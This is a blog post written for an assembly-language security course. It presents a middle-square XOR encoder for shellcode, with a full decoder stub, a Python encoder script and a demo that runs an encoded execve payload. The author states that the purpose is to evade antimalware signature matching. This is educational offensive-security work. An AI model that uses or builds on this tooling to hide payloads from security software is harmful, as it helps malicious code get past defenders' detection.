---
layout: post
title: Middle Squares Encoding Scheme
---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

*http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*

*Student ID: SLAE - 1187*

*[Sample decoder stub source](https://github.com/fbcsec/slae-assignments/blob/master/4-custom-encoder/middle-squares-decoder.asm)*

*[Python encoder](https://github.com/fbcsec/slae-assignments/blob/master/4-custom-encoder/middle-squares-encoder.py)*

Introduction
============

This post will discuss a simple encoding technique for shellcode payloads. This technique uses a very simple pseudorandom number generation technique known as the 'middle-square' method to produce a sequence of encoded bytes that appears to be totally random. 

Before we start, a quick note on 'encoding' versus 'encryption'. Encoding transforms data in a way that is not expected to be unreadable or unrecoverable. Encryption is intended to keep secrets. The goal here is not to keep our shellcode secret. Other encoding schemes are primarily for transforming data for transmission. However, in our case, we're interested in tripping up the pattern matching of common antimalware software.

The Middle-square Method
=========================

The middle-square method is a simple way of deterministically generating pseudorandom numbers from a small initial value. This value is called a 'seed', however I may refer to it as a 'key'. 

Simply, we take our seed, square it (multiply it by itself), remove equally from the left and right of the result enough data so it is the same size as the seed, and then repeat. 

Simply illustrated:

```
         seed 
        867539
           |
           V
        seed**2 (seed * seed)
     752623916521
           |
           V
       new_seed
        623916
           |
           V
       new_seed**2
     389271175056
           |
           V
        271175
           |
           V
      3535880625
          ...   
```

The middle-square method is not sufficient to generate random numbers for an application that requires real security. By using an insecure pseudorandom number generator (PRNG) such as this we would significantly weaken the keys generated using random numbers provided by it. Many cryptographic systems rely on the difficulty of searching through a massive 'key space' or all of the possible keys that could have been used to encrypt a message. Use of a weak PRNG such as this would allow an attack the advantage of only having to search though the significantly smaller 'seed space' to find the seed that generated the keys.  

The reason I've chosen this method is not because of its ability to securely generate random numbers, but its ability to reliably generate the same sequence of random-looking numbers given the same input with minimal work (i.e. few bytes needed.)

The Scheme
==========

Implementation of my scheme is most easily discussed in terms of assembly. There is a large burden placed on the Python encoder to optimize things for the least amount of work on the part of the decoder stub.

To put things in plan english, we'll pick a seed, square it with `MUL`, and retrieve the new seed's  low bytes from the high bytes of EAX and the seed's high bytes from DX.

For example:

```
Seed: 0x41424344

Squaring this results in...

Result: 0x10a2b74f48bcaa10

       EDX        EAX
 | 0x10a2b7f4 | 0x47bcaa10 |
        
        |b7f4     47bc|            

New Seed: 0xb7f447bc
```

This new seed is what we'll use to encode/decode four bytes from the payload. Once we've done this we'll use this new seed as the seed for the next round. It will be squared, the middle bytes between EDX and EAX will be retrieved, XORed with payload bytes, so on and so forth. 

### Implementing the Decoder

I'll utilize the JMP, CALL, POP method to retrieve a pointer to the data we want to decode. 

```nasm
_start:
    jmp short call_decoder
    
```
...
```nasm
call_decoder:
    call setup
    shellcode: db 0xd2, 0x42, 0x08, 0xc3 ; ...

```

For the uninitiated, JMP, CALL, POP is a technique that allows us to get the memory address of some data we've injected into a buffer. Consider the typical execution environment of shellcode where we will generally only have definite knowledge of offsets that data is at in our code, it's extremely helpful to be able to get direct access to a memory address. 

By placing out data right after a CALL instruction we implicitly PUSH the address of the next instructions after the call to the stack. These don't actually have to be executable instructions, in this case it will be our encoded payload. We JMP to the CALL, and then CALL the offset for the setup of our decoder. 

 ```nasm
setup:
    xor ecx, ecx       
    pop esi            
    mov edi, esi       

```

Here we start with some basic setup for the stub. ECX will need to be zeroed, although we don't need access to any zeroes in the decoder. Next we `pop esi` to get the pointer to the encoded data that was pushed to the stack by CALL. Then we copy this into EDI. We'll be using EDX to iterate over the encoded data, and will want to keep ESI as an anchor to the start we can JMP to when we've finished decoding. 

```nasm
    mov eax, 0x7d6d4489     ; seed value
    mov cl, 0x07            ; length of payload in bytes
```

Here we write the initial seed into EAX and the number of dwords of encoded payload we'll need to iterate over into CL.

Refer back to my reverse shell and bind shell payload articles for information on how you'd cleanly move seeds and lengths that contain nulls around. 

```nasm
decode_loop:
    mul eax
```

With the seed in EAX we can start the decoding process. We start by squaring EAX. This is done simply my MUL-ing EAX. 

The result of MUL is spread between EDX and EAX with any overflow being discarded. The state of EDX and EAX given the seed used above is now as follows:

```
EDX: 0x3d73e391
EAX: 0x39031151
``` 

We want to take the 'middle' value of this result, meaning the high two bytes of EAX and the low two bytes of EDX (DX). In addition, DX will be the high bytes of the seed, and the high bytes of EAX will be the low bytes. 

```nasm
    mov ax, dx          
    ror eax, 0x10
```

To get value we overwrite the low bytes of EAX (AX) with DX. Then we do a bitwise rotate to the right sixteen places, swapping the high bytes of EAX with AX. 

The state of EAX should now be `EAX: 0xe3913903`

```nasm
    mov ebx, eax        
    bswap ebx
```

Next we do some preparation before we operate on any data. The value that we've produced in EAX will be the seed for the next round of generation and decoding. The XOR operation we'll be doing next is destructive to destination register, so we'll want to make sure to operate on the value elsewhere. 

As for the `bswap` instruction, the data we're encoding is stored in memory in little-endian format, while the seeds we're generating and using are being created in big-endian format. When we move a dword of data out of memory into a register it will come in backwards. This is something the encoder could handle - reversing each four byte dword to send off. I believe this would require padding the data with anywhere between one and three bytes if it does not evenly fit into dwords. So I've made the tradeoff to always 'pay' two bytes to the `bswap` instruction instead. 

We're now ready to decode. 

```nasm
    xor ebx, dword [edi]
    mov [edi], ebx      
    add edi, 0x04       
    loop decode_loop    
    jmp esi             
```

We XOR the `bswap`-ed output of the middle square method with four bytes of data pointed to by edi. We then write to this location the result of the XOR, which is stored in EBX. This round is now finished and we can move onto the next one. 

We move up the pointer in edx four bytes to point to the next four bytes of encoded data and use a `loop` instruction to decrement ECX and JMP back to the start of the decode loop. If ECX is zero when we reach this point we JMP to ESI, which has in it saved the initial pointer to the start of the data we've decoded.


## The Encoder

The encoder on display here appears complex at face value, however the majority of this complexity is a crutch for dealing with the poor ability of Python to handle dealing with binary data. The meat of the encoder that's relevant to this discussion is implementing the middle squares algorithm in a way that simulates the behavior of the instructions that will be used in the decoder. 

```python
def expand_seed(seed, limit):
    """Expand seed into a list of ints that represents a pad of bytes to use for encoding."""
    pad = []

    for i in range(0, limit):

        seed = seed * seed
        hexseed = "{0:#0{1}x}".format(seed, 18)[-16:][4:12]  # get the middle eight bytes of the squared seed
        for j in range(0, len(hexseed), 2):
            pad.append(hexseed[j:j+2])
        seed = int(("0x" + hexseed), 16)

    processed_pad = array_hex_str_to_ints(pad)
    return processed_pad
```

This code, in plain english, expands the seed provided to it into a list of integers that can be used to encode up to the limit provided. 
 
 It uses Python's format string method to convert an integer to hex, zero padded to 16 bytes. We then can extract the 'middle bytes' at offset 4 through offset 12, which reflects DX and the high two bytes of EAX if this were carried out in assembly. We then convert these strings back to integers and append them to a list. This list is what's returned and used ultimately to encode the input shellcode. 
 
 Because we use an XOR to transform the data, the encoding and decoding process in assembly are identical, although it is impractical to output the result in a human readable format using assembly language. 

#### Nulls

The proof of concept encoder simply avoids the issue of null bytes in the stub by limiting the size of the payload to encode to 1024 bytes (1KB) and by rejecting generated seeds that contain nulls. This is to conserve space in the decoder stub. 1024 bytes isn't a hard limit for this scheme, just the encoder's automatic shellcode generation. Invoking the encoder with `-e` will spit out the raw encoded payload, the seed, and the length so as to manually insert into a shellcode/nasm source. Refer to the sections dealing with port number and IP address in my reverse shell shellcode article for how you would go about safely getting a value that includes nulls into a register in your shellcode.

Advantages and Disadvantages of This System
===========================================

This encoding method has two main advantages. 

First the random appearance of the encoded payload makes it difficult to identify without inspecting the decoder stub.  

Second, the simple, predictable method of stretching the seed allows for flexibility in obfuscating the decoder stub. One could write a totally different stub that uses wildly different methods from the reference stub and still achieve the same qualities.

There are several disadvantages of this method, all borne from edge cases. 

As the size of the shellcode to encode increases so does the difficulty of finding a key that does not, when encoding its data, produce an output that includes a null byte. There is a roughly one in 256 chance that any given byte will be encoded with itself, producing a null. I've considered a few ways to handle this. The current method is brute force - that is just running the encoder with different random seeds until it produces a valid output. Another possibility is to just use the offending byte unencoded. Then we'd go byte by byte over the pad produced by the seed and the encoded values. If they would have encoded to a null we just don't decode the byte and move on.'

Next, it is possible that a given seed will produce a repeating series of zeroes after a while. This happens with, for example, the seed `0x5c0b63f9`. After about 226 bytes of expansion it begins spilling out zeroes.  

In addition, it's entirely possible that this will output a series of encoded bytes that matches an antimalware signature, however the likelihood of this is quite low.  

Final Thoughts
==============

The test of this encoder/decoder is to encode a simple execve shellcode, decode it, and run it. This shellcode can be found [here](https://github.com/fbcsec/slae-assignments/blob/master/4-custom-encoder/simple_execve.asm). Building it and dumping its opcodes using the techniques detailed in my tcp bind shell post results in a hex escaped string that can be fed into my [encoder script](https://github.com/fbcsec/slae-assignments/blob/master/4-custom-encoder/middle-squares-encoder.py). The encoder script returns a hex encoded string of bytes that can be dropped into the C [shellcode host](https://github.com/fbcsec/slae-assignments/blob/master/templates/shellcode_host.c) and compiled. 

The [reference decoder](https://github.com/fbcsec/slae-assignments/blob/master/4-custom-encoder/middle-squares-decoder.asm) detailed in this post and linked to on github decodes and runs an execve shellcode.

```
# objdump shellcode_host.elf -D -M intel
...
00002020 <shellcode>:
    2020:	eb 23                	jmp    2045 <shellcode+0x25>
    2022:	31 c9                	xor    ecx,ecx
    2024:	5e                   	pop    esi
    2025:	89 f7                	mov    edi,esi
    2027:	b8 94 32 5f 80       	mov    eax,0x805f3294
    202c:	b1 07                	mov    cl,0x7
    202e:	f7 e0                	mul    eax
    2030:	66 89 d0             	mov    ax,dx
    2033:	c1 c8 10             	ror    eax,0x10
    2036:	89 c3                	mov    ebx,eax
    2038:	0f cb                	bswap  ebx
    203a:	33 1f                	xor    ebx,DWORD PTR [edi]
    203c:	89 1f                	mov    DWORD PTR [edi],ebx
    203e:	83 c7 04             	add    edi,0x4
    2041:	e2 eb                	loop   202e <shellcode+0xe>
    2043:	ff e6                	jmp    esi
    2045:	e8 d8 ff ff ff       	call   2022 <shellcode+0x2>
    204a:	64 28 a2 16 09 19 00 	sub    BYTE PTR fs:[edx+0x190916],ah
    2051:	78 da                	js     202d <shellcode+0xd>
    2053:	da c5                	fcmovb st,st(5)
    2055:	a0 07 b5 f0 0f       	mov    al,ds:0xff0b507
    205a:	30 64 1d 9b          	xor    BYTE PTR [ebp+ebx*1-0x65],ah
    205e:	57                   	push   edi
    205f:	eb 8e                	jmp    1fef <_GLOBAL_OFFSET_TABLE_+0x1b>
    2061:	98                   	cwde   
    2062:	32                   	.byte 0x32
    2063:	9f                   	lahf   
    2064:	0a 00                	or     al,BYTE PTR [eax]
...
# ./shellcode_host.elf 
Shellcode length: 48
# id
uid=0(root) gid=0(root) groups=0(root)
# 

```

Note how the data at `000204a` is essentially garbage instructions. This is the encoded data that the stub decodes. 

Full Sources
============

## Reference Decoder

[Decoder Github link](https://github.com/fbcsec/slae-assignments/blob/master/4-custom-encoder/middle-squares-decoder.asm)

```nasm
; x86 middle squares decoder stub sample
; Author: @0x0fbc
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187

global _start

section .text

_start:
    jmp short call_decoder

setup:
    xor ecx, ecx            ; empty ecx
    pop esi                 ; pop the address of encoded shellcode to ESI
    mov edi, esi            ; save this address in EDI
    mov eax, 0x7d6d4489     ; write initial seed into eax
    mov cl, 0x07            ; move the length of the shellcode in bytes rounded up to the nearest byte into cl

decode_loop:
    mul eax                 ; square the seed
    mov ax, dx              ; We want the middle bytes between EAX and EDX combined. To get this simply we move the low bytes we want from EDX into the low bytes we will discard from EAX.
    ror eax, 0x10           ; then we rotate EAX 16 bits to get the bits into position. The output of this is not only what to decode our encoded shellcode but also the next round's seed.
    mov ebx, eax            ; copy the result into ebx to operate on, we need to hold onto the value returned by MUL in eax as it is the new seed for the next round of stretching.
    bswap ebx               ; when we dereference edi to get encoded bytes, they'll come back in little-endian format, to cut down on size we switch the endianness of ebx
    xor ebx, dword [edi]    ; decode four bytes of encoded shellcode
    mov [edi], ebx          ; write the encoded shellcode back to memory
    add edi, 0x04           ; increment edi so it points to the next four bytes of encoded shellcode
    loop decode_loop        ; if we haven't iterated over the entire shellcode, move to the next round of decoding.
    jmp esi                 ; otherwise JMP to what should be decoded shellcode.


call_decoder:
        call setup
        shellcode: db 0xd2,0x43,0x08,0xc3,0x8f,0x14,0xdb,0x37,0x89,0x06,0xa7,0xd2,0xfc,0x58,0xe4,0xee,0xd3,0x3f,0xe3,0xa3,0x65,0x15,0xe6,0xc3,0x39,0xf0,0x18

```

## Encoder Script/Wrapper

[Encoder github link](https://github.com/fbcsec/slae-assignments/blob/master/4-custom-encoder/middle-squares-encoder.py)
```python
#!/usr/bin/env python3
"""
x86 Middle Squares Decoder Stub Sample
Usage: this_script.py [-e] <shellcode_to_encode>, if -e is set do not return full shellcode with decoder stub.
Author: @fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""

from sys import argv
from secrets import SystemRandom


def nulls_in_hex(input_int):
    """Determine if there are nulls in a given dword sized int."""
    hex_input = "{0:#0{1}x}".format(input_int, 10)
    split_hex = map("".join, zip(*[iter(hex_input)]*2))
    hex_list = list(split_hex)
    for i in hex_list:
        if i == '00':
            return True
    return False

def nulls_in_bytearray(input_bytearray):
    for i in input_bytearray:
        if i == 0:
            return True
    return False

def generate_seed():
    """Generate and return an int that when converted to bytes contains no nulls."""
    seed = 0

    while nulls_in_hex(seed) is True:
        seed = SystemRandom().randrange(0x0000FFFF, 0xFFFFFFFF)  # generate a random seed
    if nulls_in_hex(seed) is False:  # Ensure that we're returning a seed without nulls
        return seed
    else:
        raise Exception("generate_seed() tried to return a seed with null bytes")


def array_hex_str_to_ints(list_of_hex_strings):
    """This function accepts a list of strings containing hex digits and
    converts each item into bytes.
    For example, [21, 41, 42, 43] is converted into [b'!', b'A', b'B', b'C']
    """

    for item in range(0, len(list_of_hex_strings)):
        list_of_hex_strings[item] = int(list_of_hex_strings[item], 16)

    return list_of_hex_strings


def expand_seed(seed, limit):
    """Expand seed into a list of ints that represents a pad of bytes to use for encoding."""
    pad = []

    for i in range(0, limit):

        seed = seed * seed
        hexseed = "{0:#0{1}x}".format(seed, 18)[-16:][4:12]  # get the middle eight bytes of the squared seed
        for j in range(0, len(hexseed), 2):
            pad.append(hexseed[j:j+2])
        seed = int(("0x" + hexseed), 16)

    processed_pad = array_hex_str_to_ints(pad)
    return processed_pad


def process_shellcode(shellcode_input):
    """Convert a string of hex values formatted as C-style hex escapes
    into an array of integers."""

    split_shellcode = shellcode_input.split("x")
    split_shellcode = split_shellcode[1::]  # Remove bogus empty string at start of array

    processed_shellcode = array_hex_str_to_ints(split_shellcode)

    return processed_shellcode


def encode_to_strings(seed, shellcode):
    """Encode provided shellcode and return human-readable strings for use with
    C-like languages or NASM.
    seed must be a dword (32 bit) sized int
    shellcode must be an array of char sized ints, preferably from process_shellcode"""

    pad = expand_seed(seed, ((len(shellcode) // 4) + 1))

    hex_escape_encoded = b''
    nasm_escaped_encoded = b''

    for i in range(0, len(shellcode)):
        encoded_byte = shellcode[i] ^ pad[i]

        hex_escape_encoded += b'\\x'
        hex_escape_encoded += bytes('%02x' % (encoded_byte & 0xff), 'iso-8859-1')

        nasm_escaped_encoded += b'0x'
        nasm_escaped_encoded += bytes('%02x,' % (encoded_byte & 0xff), 'iso-8859-1')

    return hex_escape_encoded, nasm_escaped_encoded


def encode_to_bytes(seed, shellcode):
    """Encode provided shellcode and return encoded bytes as a bytearray.
    seed must be a dword (32 bit) sized int
    shellcode must be an array of char sized ints, preferably from process_shellcode"""
    pad = expand_seed(seed, ((len(shellcode) // 4) + 1))

    encoded_shellcode = []

    for i in range(0, len(shellcode)):
        encoded = shellcode[i] ^ pad[i]

        encoded_shellcode.append(encoded)

    return bytes(encoded_shellcode)


def set_ecx(rounds_needed):
        return b"\xb1" + rounds_needed.to_bytes(1, byteorder='little')


def main():
    usage = """
    Usage: %s [-e] <shellcode_to_encode>
    -e
        If the -e flag is used, only encode the shellcode, do not insert it into a decoder stub.
    """
    if len(argv) < 2:
        print(usage)
        raise SystemExit
    elif len(argv) > 2 and argv[1] != '-e':
        print(usage)
        raise SystemExit
    elif len(argv) == 2 and argv[1] == '-e':
        print(usage)
        raise SystemExit

    if argv[1] == '-e':
        """If called with -e flag encode and return seed, various lengths
        the initial seed, and the encoded bytes in various formats."""
        shellcode = process_shellcode(argv[2])
        seed = generate_seed()
        hex_escaped_encoded, nasm_escaped_encoded = encode_to_strings(seed, shellcode)

        print('Real shellcode length in bytes: %d' % len(shellcode))
        print('Number of rounds to decode: %d' % ((len(shellcode) // 4) + 1))
        print('Starting seed: %s' % hex(seed))
        print('\nEncoded data hex escaped:')
        print(str(hex_escaped_encoded, 'utf-8'))
        print('\nEncoded data in 0x (nasm) format:')
        print(str(nasm_escaped_encoded, 'utf-8')[:-1])
    else:
        """If not called with -e encode shellcode, build a decoder, and return
        complete shellcode with completed decoder stub."""
        shellcode = process_shellcode(argv[1])
        if len(shellcode) > 1023:
            print('ERROR: Payload cannot be longer than 1024 bytes!')

        while True:
            seed = generate_seed()
            decoder = (
                       bytearray("\xeb\x23"         # <_start>: jmp <call_decoder>
                                 "\x31\xc9"         # <setup>: xor ecx, ecx
                                 "\x5e"             # pop esi
                                 "\x89\xf7",
                                 'iso-8859-1')        # mov edi, esi

                       + b"\xb8"                    # mov eax, <seed>
                       + seed.to_bytes(4, byteorder='little',
                                       signed=False)

                       + bytearray(set_ecx(((len(shellcode) // 4) + 1)))

                       + bytearray("\xf7\xe0"       # <decode_loop>: mul eax
                                   "\x66\x89\xd0"   # mov ax, dx
                                   "\xc1\xc8\x10"   # ror eax, 0x10
                                   "\x89\xc3"       # mov ebx, eax
                                   "\x0f\xcb"       # bswap ebx
                                   "\x33\x1f"       # xor ebx, [edi]
                                   "\x89\x1f"       # mov [edi], ebx
                                   "\x83\xc7\x04"   # add edi, 0x04
                                   "\xe2\xeb"       # loop <decode_loop>
                                   "\xff\xe6"       # jmp esi
                                   "\xe8\xd8\xff\xff\xff",  # call <setup>
                                   'iso-8859-1')
                     )

            shellcode_with_decoder = decoder + encode_to_bytes(seed, shellcode)

            return_string = b''

            if nulls_in_bytearray(shellcode_with_decoder) is True:
                continue

            for i in shellcode_with_decoder:
                return_string += b'\\x'
                return_string += b'%02x' % (i & 0xff)

            break

        print('Middle Squares Shellcode Encoder')
        print('Seed used: %s' % hex(seed))
        print('\nLength: %d\n' % len(shellcode_with_decoder))
        print(return_string.decode("utf-8"))


if __name__ == '__main__':
    main()

```
